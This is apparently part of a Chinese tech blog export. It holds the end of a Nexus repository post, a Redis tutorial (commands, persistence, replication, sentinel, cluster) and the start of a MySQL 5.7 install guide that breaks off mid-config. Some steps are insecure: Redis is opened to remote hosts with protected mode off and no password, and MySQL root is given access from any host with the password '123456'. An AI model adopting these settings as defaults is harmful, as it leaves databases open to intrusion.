<p>nx-repository-view-maven2-maven-releases-read</p>
<p>nx-repository-view-maven2-maven-snapshots-add</p>
<p>nx-repository-view-maven2-maven-snapshots-browse</p>
<p>nx-repository-view-maven2-maven-snapshots-edit</p>
<p>nx-repository-view-maven2-maven-snapshots-read</p>
<p>继承nx-anonymous角色的权限</p>
<h2 id="4-3-developer用户创建"><a href="#4-3-developer用户创建" class="headerlink" title="4.3. developer用户创建"></a>4.3. developer用户创建</h2><p>创建developer角色的用户developer，新建的用户: developer:developer，管理员账户（初始密码）: admin:admin123</p>
]]></content>
      <categories>
        <category>Nexus</category>
      </categories>
      <tags>
        <tag>Nexus</tag>
        <tag>Maven私服</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis基础使用</title>
    <url>/2021/06/17/Redis%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-5.0.0.tar.gz</span><br><span class="line">tar -zxvf redis-5.0.0.tar.gz</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">//如果提示缺失cc，执行：</span><br><span class="line">yum -y install gcc gcc-c++ libstdc++-devel</span><br><span class="line">yum -y install centos-release-scl</span><br><span class="line">yum -y install devtoolset-9-gcc devtoolset-9-gcc-c++ devtoolset-9-binutils</span><br><span class="line">scl enable devtoolset-9 bash</span><br><span class="line"></span><br><span class="line">make PREFIX=/usr/local/redis install</span><br><span class="line">cp redis.conf /usr/local/redis/        //把解压包下的redis.conf复制到/usr/local/redis/下</span><br><span class="line"></span><br><span class="line">把redis的bin配置到profile下是的可以在任何目录下直接输入redis相关命令 （非必须）</span><br></pre></td></tr></table></figure>

<h1 id="2-通用命令"><a href="#2-通用命令" class="headerlink" title="2. 通用命令"></a>2. 通用命令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key为String，value有五种类型：String,Hash,List,Set,ZSet(有序的Set)，端口默认：6379</span><br><span class="line"></span><br><span class="line">flushdb		清空当前数据库</span><br><span class="line">flushall	清空所有数据库</span><br><span class="line">keys pattern		查询redis里与其匹配的所有key，pattern中*代表任意个任意字符，?代表一个任意字符</span><br><span class="line">del key		删除key</span><br><span class="line">exists key		判断key是否存在</span><br><span class="line">rename key1 key2		把key1改名为key2</span><br><span class="line">type key	获取值的类型</span><br><span class="line">expire key seconds		设置过期时间为seconds秒</span><br><span class="line">ttl key		查看过期时间，若为-1，则长期保存，若为-2，则已过期被redis删除</span><br><span class="line">dbsize		返回数据库key的数目</span><br><span class="line">info		查看redis的信息</span><br><span class="line">quit		退出，相当于ctrl+c</span><br><span class="line">ping		查看是否跟服务器连通</span><br><span class="line">select 0	切换到0号数据库，可以0-15</span><br><span class="line">move key [0-15]		key的移植，把当前数据库的key移植到其它数据库</span><br><span class="line"></span><br><span class="line">消息订阅：</span><br><span class="line">subscribe channel		订阅频道channel</span><br><span class="line">psubscribe channel*		订阅以channel开头的频道</span><br><span class="line">publish channel content 往频道channel发布content消息</span><br><span class="line"></span><br><span class="line">事务（其实是批量化操作）：</span><br><span class="line">multi		开启事务，begin transaction</span><br><span class="line">exec		执行，commit</span><br><span class="line">discard		回滚，rollback</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ol>
<li><p>前端启动不能集群，修改redis.conf里面的daemonize为yes进行后端启动才能支持集群，后端启动：.&#x2F;bin&#x2F;redis-server .&#x2F;redis.conf，关闭：.&#x2F;bin&#x2F;redis-cli shutdown</p>
</li>
<li><p>使用redis进行远程连接时，需要注释：bind 127.0.0.1以及把保护模式protected-mode设为no</p>
</li>
</ol>
<h1 id="3-五大类型-常用的五种"><a href="#3-五大类型-常用的五种" class="headerlink" title="3. 五大类型(常用的五种)"></a>3. 五大类型(常用的五种)</h1><h2 id="3-1-String"><a href="#3-1-String" class="headerlink" title="3.1 String"></a>3.1 String</h2><ul>
<li>主要用途：存储字符串（json字符串）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set key value		设置、修改值</span><br><span class="line">get key		获取值</span><br><span class="line">del key		删除值，返回删除的键值对的个数</span><br><span class="line">getset key value	先获取值，再设置新的值</span><br><span class="line">append key value	若key不存在，则给key设定一个value，如果存在则在原来value上追加value</span><br><span class="line"></span><br><span class="line">当字符串为数值时：</span><br><span class="line">incr num1	相当于++num1</span><br><span class="line">decr num1	相当于 --num1</span><br><span class="line">incrby num1 10		返回num1+10</span><br><span class="line">decrby num1 10		返回num1-10</span><br></pre></td></tr></table></figure>

<h2 id="3-2-Hash"><a href="#3-2-Hash" class="headerlink" title="3.2 Hash"></a>3.2 Hash</h2><ul>
<li>主要用途：方便存JavaBean</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hset key field value	设置key的field值为value</span><br><span class="line">hget key field		获取key的field的值</span><br><span class="line">hdel key field		删除key的field</span><br><span class="line">hgetall key			获取key所有field以及它的值，格式为f1换行v1，f2换行v2</span><br><span class="line">hmset key field1 value1 field2 value2		设置key的多个field对应的值</span><br><span class="line">hmget key field1 field2		获取key的field1,field2的值</span><br><span class="line">del key		删除整个key</span><br></pre></td></tr></table></figure>

<ul>
<li>拓展：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexists key field		判断key里是否存在field</span><br><span class="line">hlen key		返回key里面field的数目</span><br><span class="line">hvals key		返回key里所有field的值</span><br><span class="line">hkeys key		返回key里所有的field名</span><br></pre></td></tr></table></figure>

<h2 id="3-3-List"><a href="#3-3-List" class="headerlink" title="3.3 List"></a>3.3 List</h2><ul>
<li>主要用途：大数据的增删、任务队列</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lpush key value1 value2		从链表左边依次添加，结果为value2 value1</span><br><span class="line">rpush key value1 value2		从链表右边依次添加，结果为value1 value2</span><br><span class="line">lrange key start end		获取列表元素，非负数从左开始，负数从右开始，lrange key 0 -1获取所有元素</span><br><span class="line">lpop key	删除左侧元素，返回删除元素的值</span><br><span class="line">rpop key	删除右侧元素，返回删除元素的值</span><br><span class="line">llen key	获取list的长度</span><br><span class="line">rpoplpush source destination	把source右测的元素删除，并把它添加到destination的左测，做任务队列</span><br></pre></td></tr></table></figure>

<ul>
<li>拓展（效率不高）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lrem key count value	当count=0时，删除所有的value，当count&gt;0时，从左往右删除count个value，当count&lt;0时，从右往左删除count个value</span><br><span class="line">lset key index value	把下标为index位置的元素设置为value</span><br><span class="line">linsert key before|after pivot value	在元素pivot前或者后插入值为value的元素</span><br></pre></td></tr></table></figure>

<h2 id="3-4-Set"><a href="#3-4-Set" class="headerlink" title="3.4 Set"></a>3.4 Set</h2><ul>
<li>主要用途：做交集、并集、差集等操作、无序不可重复</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sadd key member1 [member2 ...]		往key中添加元素</span><br><span class="line">srem key member1 [member2 ...]		删除key中的元素</span><br><span class="line">smembers key		获取key的所有元素</span><br><span class="line">sismember key member		判断key中是否存在member</span><br><span class="line">scard key		获取key元素个数</span><br><span class="line">sdiff key1 key2		属于key1不属于key2</span><br><span class="line">sinter key1 key2		key1和key2交集</span><br><span class="line">sunion key1 key2		key1和key2并集</span><br></pre></td></tr></table></figure>

<ul>
<li>拓展</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sdiffstore destination key1 key2		属于key1不属于key2的元素，并存于destination中</span><br><span class="line">sinterstroe destnation key1 key2		获取key1和key2交集，并存于destination中</span><br><span class="line">sunionstroe destination key1 key2		获取key1和key2并集，并存于destination中</span><br><span class="line">srandmember key [count]			从key中获取count个随机元素，count可以省略，默认获取一个</span><br></pre></td></tr></table></figure>

<h2 id="3-5-zset"><a href="#3-5-zset" class="headerlink" title="3.5 zset"></a>3.5 zset</h2><ul>
<li>主要用途：做排行榜</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zadd key score1 member1 [score2 member2 ...]		添加元素，并赋值分数，默认从小到大排序</span><br><span class="line">zrem key member1 [member2...]		删除元素</span><br><span class="line">zrange key start stop [withscores]		获取start到stop的元素，分数由小到大排序</span><br><span class="line">zrevrange key start stop [withscores]		获取start到stop的元素，分数由大到小排序</span><br><span class="line">zscore key member		获取member的score</span><br><span class="line">zcard key		获取key元素个数</span><br><span class="line">zremrangebyrank key start stop		按照排名进行范围删除</span><br><span class="line">zremrangebyscore key min max		按照分数进行范围删除</span><br></pre></td></tr></table></figure>

<ul>
<li>拓展</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zrangebyscore key min max [withscore] [limit offset count]		返回分数在min与max之间的元素，从offset开始，共count个，分数由低到高排序</span><br><span class="line">zrevrangebyscore key max min [withscore] [limit offset count]		返回分数在min与max之间的元素，从offset开始，共count个，分数由高到低排序</span><br><span class="line">zincrby key incrememt member		为成员member增加incrememt分</span><br><span class="line">zcount key min max		获取分数在min,max之间的成员个数</span><br><span class="line">zrank key member		返回成员在集合中的排名，分数由低到高</span><br><span class="line">zrevrank key member		返回成员在集合中的排名，分数由高到低</span><br></pre></td></tr></table></figure>

<h1 id="4-持久化策略"><a href="#4-持久化策略" class="headerlink" title="4. 持久化策略"></a>4. 持久化策略</h1><ol>
<li>RDB（默认，内存充裕推荐使用，快照为dump.rdb）</li>
</ol>
<blockquote>
<p>优点：备份，还原速度快，高效，相当于照快照，适合灾难备份</p>
<p>缺点：启动RDB策略有一定规则，可能随时启动，会占用较大内存</p>
<p>启动条件：</p>
<p>​     1.正常关闭，.&#x2F;redis&#x2F;bin&#x2F;redis-cli shutdown</p>
<p>​     2.配置文件的：</p>
<p>​          save 900 1    15分钟至少有1个key发生改变</p>
<p>​          save 300 10   5分钟至少有10个key发生改变</p>
<p>​          save 60 10000 1分钟至少有10000个key发生改变</p>
</blockquote>
<ol start="2">
<li>AOF（通过日志记录改变key的语句来备份，备份文件appendonly.aof）</li>
</ol>
<blockquote>
<p>优点：持续占用很小的内存来运行备份程序</p>
<p>缺点：日志文件比较大，不适合灾难备份</p>
<p>备份策略：每秒备份（默认，不安全 ）、每修改备份（建议使用）、不备份</p>
<p>改appendonly为yes</p>
</blockquote>
<h1 id="5-主从复制"><a href="#5-主从复制" class="headerlink" title="5. 主从复制"></a>5. 主从复制</h1><ul>
<li>这里以1个master，2个slave为例（主服务器负责写，从服务器只能读），新建配置6379.conf：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include /usr/local/redis/conf/redis.conf</span><br><span class="line">daemonize yes</span><br><span class="line">pidfile /var/run/redis_6379.pid</span><br><span class="line">port 6379</span><br><span class="line">dbfilename dump6379.rdb</span><br><span class="line">appendonly no</span><br></pre></td></tr></table></figure>

<ul>
<li>复制多两份分别为6380.conf，6381.conf，并通过：%s&#x2F;6379&#x2F;6380和%s&#x2F;6379&#x2F;6381分别把内容中的6379替换为6380和6381：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 分别启动这三个配置文件</span><br><span class="line">redis-server 6379.conf</span><br><span class="line">redis-server 6380.conf</span><br><span class="line">redis-server 6381.conf</span><br><span class="line"></span><br><span class="line">redis-cli -h 127.0.0.1 -p 6380		// 分别连上6380和6381这两个redis，并执行slaveof命令</span><br><span class="line"></span><br><span class="line">slaveof 127.0.0.1 6379  // 表示6380和6381均以6379作为主服务器</span><br></pre></td></tr></table></figure>

<ul>
<li>相关命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info replication     //查看节点信息</span><br><span class="line"></span><br><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;      //设置当前节点的主节点，从服务器可以作为下一个从服务器的主服务器，但是中间节点宕机的话，前后节点就没关联了，但是前面节点宕机的话，还有后面的节点可以做写入操作</span><br><span class="line"></span><br><span class="line">slaveof no one     //去掉主服务器（当前服务器为主服务器）</span><br></pre></td></tr></table></figure>

<ul>
<li>缺点</li>
</ul>
<ol>
<li><p>主服务器宕机后，只能进行读取操作</p>
</li>
<li><p>每次重启都得重新去建立主从节点的关系</p>
</li>
</ol>
<h1 id="6-哨兵模式（sentinel）"><a href="#6-哨兵模式（sentinel）" class="headerlink" title="6. 哨兵模式（sentinel）"></a>6. 哨兵模式（sentinel）</h1><ul>
<li>一主二从三哨兵（建立在主从模式的基础上，因此也需要用slaveof先设定好主从的关系），新建sentinel.conf</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sentinel monitor mymaster 127.0.0.1 6379 1  #mymaster为哨兵服务的名字，1代表多少个哨兵认为主服务器宕机才算宕机，一般为基数</span><br></pre></td></tr></table></figure>

<ul>
<li>启动哨兵</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-sentinel sentinel.conf</span><br></pre></td></tr></table></figure>

<ul>
<li>优点：解决了主从复制的宕机后，只能读取的问题，且重启后，不需要手动确定主从关系（所哨兵都宕机除外）</li>
<li>主服务器宕机后，主节点的选取机制：<ul>
<li><p>不需要所有哨兵一起选举，只需要选举出一个Leader哨兵，由Leader哨兵再选举出主节点即可，选举Leader哨兵的方法（raft算法）：</p>
<ul>
<li>按照“先下手为强”的本质，每个哨兵每一轮都只有1票，每个哨兵分别为自己拉票，通常是最先发现主节点宕机的哨兵先发起拉票，票数超一半则选举结束，成为Leader哨兵，否则进入第二轮选举，所以通常哨兵个数为奇数。</li>
</ul>
</li>
<li><p>Leader哨兵选举主节点的规则（优先级 &gt; offset &gt; run id）：</p>
<ul>
<li>优先级最高的，配置文件中slave-priority的值较小的，默认情况下都相同；</li>
<li>偏移量offset最大的，代表从主节点同步的进度，越大代表数据量越接近主节点；</li>
<li>run id最小的，每个redis实例启动后都会随机生成一个40位的run id；</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="7-集群（至少要有3个主节点）"><a href="#7-集群（至少要有3个主节点）" class="headerlink" title="7. 集群（至少要有3个主节点）"></a>7. 集群（至少要有3个主节点）</h1><p>主从复制降低读写压力，集群降低内存压力，假设整个集群共N个节点，则每个节点存储1&#x2F;N的数据。尽量保证各个主节点不在同一个机器上，主节点和从节点也不在一个机器上。</p>
<p>1）ruby环境的安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install ruby</span><br><span class="line">yum install rubygems</span><br></pre></td></tr></table></figure>

<p>2）在主从模式的基础上，复制多三个配置文件6389.conf、6390.conf、6391.conf，共六个配置文件：6379.conf、6380.conf、6381.conf、6389.conf、6390.conf、6391.conf，</p>
<ul>
<li>分别增加</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cluster-enabled yes     #开启集群模式</span><br><span class="line">cluster-config-file nodes-6379.conf		#设定节点配置文件名，每个节点不一样</span><br><span class="line">cluster-node-timeout 15000       #设定节点失联时间，超过（ms），集群自动主从切换</span><br></pre></td></tr></table></figure>

<ul>
<li>单独修改</li>
</ul>
<ol>
<li>单独修改对应的pidfile、port、dbfilename、cluster-config-file</li>
<li>注释redis.conf中的bind 127.0.0.1和保护模式设为no，protected-mode no</li>
</ol>
<p>3）分别启动这六个节点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-server 6379.conf</span><br><span class="line">redis-server 6380.conf</span><br><span class="line">redis-server 6381.conf</span><br><span class="line">redis-server 6389.conf</span><br><span class="line">redis-server 6390.conf</span><br><span class="line">redis-server 6391.conf</span><br></pre></td></tr></table></figure>

<p>4）6个节点合为一个集群：</p>
<p>旧版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd redis-xxx/src</span><br><span class="line"></span><br><span class="line">./redis-trib.rb create --replicas 1 192.168.199.140:6379 192.168.199.140:6380 192.168.199.140:6381 192.168.199.140:6389 192.168.199.140:6390 192.168.199.140:6391</span><br></pre></td></tr></table></figure>

<p>新版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli --cluster create 192.168.199.140:6379 192.168.199.140:6380 192.168.199.140:6381 192.168.199.140:6389 192.168.199.140:6390 192.168.199.140:6391 --cluster-replicas 1</span><br></pre></td></tr></table></figure>

<p>这里的1为一个主节点有一个分片，这里的则为三主三从，需要写真实ip，不要写127.0.0.1，输入yes，有0-16383个插槽，共16384个，分布在各个主节点上，同时从节点有对应主节点的所有数据，数据具体插入到哪个节点上，由CRC(16)算法而得。</p>
<p>5）以集群方式进入redis</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -c -p 任意一个节点的端口</span><br><span class="line">可通过set key&#123;分组名&#125; value 指定到同一个分组，同一个分组在同一个插槽上，不能使用mget/mset</span><br><span class="line">cluster nodes  //查看集群信息</span><br><span class="line">CLUSTER KEYSLOT k1    //计算k1应该放在哪个插槽上</span><br><span class="line">CLUSTER COUNTKEYSINSLOT 12706    //返回插槽12706包含的键值对数量</span><br><span class="line">CLUSTER GETKEYSINSLOT 12706 1     //返回插槽12706包含的1个键值对的键</span><br></pre></td></tr></table></figure>

<p>6）要点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.主节点下线，从节点升为主节点；</span><br><span class="line"></span><br><span class="line">2.主节点重新上线，不会再次变为主节点，而是仍旧为从节点；</span><br><span class="line"></span><br><span class="line">3.某一段插槽的主从节点都宕机，redis默认不能使用，需要配置</span><br><span class="line">cluster-require-full-coverage no   //表示不需要16384个插槽都能正常时也对外提供服务</span><br></pre></td></tr></table></figure>

<h1 id="8-附件配置文件（sentinel-集群）"><a href="#8-附件配置文件（sentinel-集群）" class="headerlink" title="8. 附件配置文件（sentinel&#x2F;集群）"></a>8. 附件配置文件（sentinel&#x2F;集群）</h1><ul>
<li>sentinel.conf</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sentinel monitor mymaster 127.0.0.1 6380 1</span><br><span class="line"># Generated by CONFIG REWRITE</span><br><span class="line">protected-mode no</span><br><span class="line">port 26379</span><br><span class="line">user default on nopass ~* &amp;* +@all</span><br><span class="line">dir &quot;/usr/local/redis/conf&quot;</span><br><span class="line">sentinel myid c1bfe814b8700e48fa87d43c44582260d4afc002</span><br><span class="line">sentinel config-epoch mymaster 1</span><br><span class="line">sentinel leader-epoch mymaster 2</span><br><span class="line">sentinel current-epoch 2</span><br><span class="line">sentinel known-replica mymaster 127.0.0.1 6379</span><br><span class="line">sentinel known-replica mymaster 127.0.0.1 6381</span><br></pre></td></tr></table></figure>

<ul>
<li>6379.conf</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include /usr/local/redis/conf/redis.conf</span><br><span class="line">daemonize yes</span><br><span class="line">pidfile &quot;/var/run/redis_6379.pid&quot;</span><br><span class="line">port 6379</span><br><span class="line">dbfilename &quot;dump6379.rdb&quot;</span><br><span class="line">appendonly no</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file nodes-6379.conf</span><br><span class="line">cluster-node-timeout 15000</span><br></pre></td></tr></table></figure>

<ul>
<li>6380.conf</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include /usr/local/redis/conf/redis.conf</span><br><span class="line">daemonize yes</span><br><span class="line">pidfile &quot;/var/run/redis_6380.pid&quot;</span><br><span class="line">port 6380</span><br><span class="line">dbfilename &quot;dump6380.rdb&quot;</span><br><span class="line">appendonly no</span><br><span class="line">cluster-enabled yes             </span><br><span class="line">cluster-config-file nodes-6380.conf</span><br><span class="line">cluster-node-timeout 15000</span><br></pre></td></tr></table></figure>

<ul>
<li>6381.conf</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include /usr/local/redis/conf/redis.conf</span><br><span class="line">daemonize yes</span><br><span class="line">pidfile &quot;/var/run/redis_6381.pid&quot;</span><br><span class="line">port 6381</span><br><span class="line">dbfilename &quot;dump6381.rdb&quot;</span><br><span class="line">appendonly no</span><br><span class="line">cluster-enabled yes             </span><br><span class="line">cluster-config-file nodes-6381.conf</span><br><span class="line">cluster-node-timeout 15000</span><br></pre></td></tr></table></figure>

<ul>
<li>6389.conf</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include /usr/local/redis/conf/redis.conf</span><br><span class="line">daemonize yes</span><br><span class="line">pidfile &quot;/var/run/redis_6389.pid&quot;</span><br><span class="line">port 6389</span><br><span class="line">dbfilename &quot;dump6389.rdb&quot;</span><br><span class="line">appendonly no</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file nodes-6389.conf</span><br><span class="line">cluster-node-timeout 15000</span><br></pre></td></tr></table></figure>

<ul>
<li>6390.conf</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include /usr/local/redis/conf/redis.conf</span><br><span class="line">daemonize yes</span><br><span class="line">pidfile &quot;/var/run/redis_6390.pid&quot;</span><br><span class="line">port 6390</span><br><span class="line">dbfilename &quot;dump6390.rdb&quot;</span><br><span class="line">appendonly no</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file nodes-6390.conf</span><br><span class="line">cluster-node-timeout 15000</span><br></pre></td></tr></table></figure>

<ul>
<li>6391.conf</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include /usr/local/redis/conf/redis.conf</span><br><span class="line">daemonize yes</span><br><span class="line">pidfile &quot;/var/run/redis_6391.pid&quot;</span><br><span class="line">port 6391</span><br><span class="line">dbfilename &quot;dump6391.rdb&quot;</span><br><span class="line">appendonly no</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file nodes-6391.conf</span><br><span class="line">cluster-node-timeout 15000</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL基本使用与优化</title>
    <url>/2020/05/01/MySQL%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E4%B8%8E%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h1 id="1-安装mysql-5-7-38"><a href="#1-安装mysql-5-7-38" class="headerlink" title="1. 安装mysql(5.7.38)"></a>1. 安装mysql(5.7.38)</h1><p>均采用解压包的安装方式，需提前下载好：mysql-5.7.38-winx64.zip、mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz</p>
<h2 id="1-1-windows"><a href="#1-1-windows" class="headerlink" title="1.1 windows"></a>1.1 windows</h2><ul>
<li>解压到某一目录(<code>D:\InstallPath\work_portable\mysql-5.7.38-winx64</code>)，并在其下创建<code>my.ini</code>文件，内容如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[client]</span><br><span class="line">port=3306</span><br><span class="line">#socket=/tmp/mysql.sock		#windows下不需要此项配置</span><br><span class="line">default-character-set=utf8mb4</span><br><span class="line"></span><br><span class="line">[mysql]</span><br><span class="line">default-character-set=utf8mb4</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">port=3306</span><br><span class="line"></span><br><span class="line">#指定通信socket文件位置，windows下不需要此项配置</span><br><span class="line">#socket=/tmp/mysql.sock</span><br><span class="line"></span><br><span class="line">#mysql根路径</span><br><span class="line">basedir=&quot;D:/InstallPath/work_portable/mysql-5.7.38-winx64/&quot;</span><br><span class="line"></span><br><span class="line">#mysql数据路径</span><br><span class="line">datadir=&quot;D:/InstallPath/work_portable/mysql-5.7.38-winx64/data/&quot;</span><br><span class="line"></span><br><span class="line">#临时目录</span><br><span class="line">tmpdir=&quot;D:/InstallPath/work_portable/mysql-5.7.38-winx64/tmp/&quot;</span><br><span class="line"></span><br><span class="line">#忽略客户端字符集设置信息，使用服务端的字符集</span><br><span class="line">skip-character-set-client-handshake=1</span><br><span class="line"></span><br><span class="line">#服务段字符集</span><br><span class="line">character-set-server=utf8mb4</span><br><span class="line"></span><br><span class="line">#排序规则</span><br><span class="line">collation-server=utf8mb4_unicode_ci</span><br><span class="line"></span><br><span class="line">#默认存储引擎</span><br><span class="line">default-storage-engine=INNODB</span><br><span class="line"></span><br><span class="line">#sql模式</span><br><span class="line">sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO</span><br><span class="line"></span><br><span class="line">#0-表名存储为给定的大小和比较是区分大小写的（unix默认）；1-表名存储在磁盘是小写的，但是比较的时候是不区分大小写（windows默认）；2-表名存储为给定的大小写但是比较的时候是小写的（macOS默认）</span><br><span class="line">lower_case_table_names=1</span><br><span class="line"></span><br><span class="line">#最大连接数（范围：1-100000，默认151）</span><br><span class="line">max_connections=151</span><br></pre></td></tr></table></figure>

<ul>
<li><p>创建临时目录 <code>D:/InstallPath/work_portable/mysql-5.7.38-winx64/tmp/</code> </p>
</li>
<li><p>配置系统path后，在cmd下执行初始化命令，记录生成的随机密码</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqld --initialize --user=mysql --console</span><br></pre></td></tr></table></figure>

<ul>
<li>首次启动</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqld --console</span><br></pre></td></tr></table></figure>


<ul>
<li>打开新的cmd窗口执行<code>mysql -uroot -p</code>，输入 <code>“执行初始化命令后生成的随机密码”</code> 登录mysql，修改root密码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;123456&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>

<ul>
<li>停止mysql服务，把mysql添加到系统服务并启动服务（以管理员身份运行）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 添加到系统服务</span><br><span class="line">mysqld --install</span><br><span class="line"></span><br><span class="line"># 开启mysql服务</span><br><span class="line">net start mysql</span><br><span class="line"></span><br><span class="line"># 关闭mysql服务</span><br><span class="line">net stop mysql</span><br></pre></td></tr></table></figure>

<ul>
<li>远程访问（可选），重新登录mysql并执行如下SQL</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USE mysql;</span><br><span class="line">UPDATE user SET host=&#x27;%&#x27; WHERE user=&#x27;root&#x27;;</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; WITH GRANT OPTION;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行SQL查看字符集以及collation，结果如下图表示配置成功</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables WHERE variable_name like &#x27;character\_set\_%&#x27; OR variable_name like &#x27;collation%&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/../img/202204271253024.png"></p>
<h2 id="1-2-linux-centos7"><a href="#1-2-linux-centos7" class="headerlink" title="1.2 linux(centos7)"></a>1.2 linux(centos7)</h2><ul>
<li>环境准备</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install libaio</span><br></pre></td></tr></table></figure>

<ul>
<li>移除旧配置，先把<code>/etc/my.cnf</code>、<code>/etc/my.cnf.d</code>、 <code>/etc/mysql</code> 目录或文件删除（如果原有mysql配置，注意备份配置文件）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm -rf /etc/my.cnf /etc/my.cnf.d /etc/mysql</span><br></pre></td></tr></table></figure>

<ul>
<li>再创建<code>/etc/my.cnf</code>，内容如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[client]</span><br><span class="line">port=3306</span><br><span class="line">socket=/tmp/mysql.sock          #windows下不需要此项配置</span><br><span class="line">default-character-set=utf8mb4</span><br><span class="line"></span><br><span class="line">[mysql]</span><br><span class="line">default-character-set=utf8mb4</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">port=3306</span><br><span class="line"></span><br><span class="line">#指定通信socket文件位置，windows下不需要此项配置</span><br><span class="line">socket=/tmp/mysql.sock</span><br><span class="line"></span><br><span class="line">#mysql根路径</span><br><span class="line">basedir=&quot;/usr/local/mysql/&quot;</span><br><span class="line"></span><br><span class="line">#mysql数据路径</span><br><span class="line">datadir=&quot;/usr/local/mysql/data/&quot;</span><br><span class="line"></span><br><span class="line">#临时目录</span><br><span class="line">tmpdir=&quot;/usr/local/mysql/tmp/&quot;</span><br><span class="line"></span><br><span class="line">#忽略客户端字符集设置信息，使用服务端的字符集</span><br><span class="line">skip-character-set-client-handshake=1</span><br><span class="line"></span><br><span class="line">#服务段字符集</span><br><span class="line">character-set-server=utf8mb4</span><br><span class="line"></span><br><span class="line">#排序规则</span><br><span class="line">collation-server=utf8mb4_unicode_ci</span><br><span class="line"></span><br><span class="line">#默认存储引擎</span><br><span class="line">default-storage-engine=INNODB</span><br><span class="line"></span><br><span class="line">#sql模式</span><br><span class="line">sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO</span><br><span class="line"></span><br><span 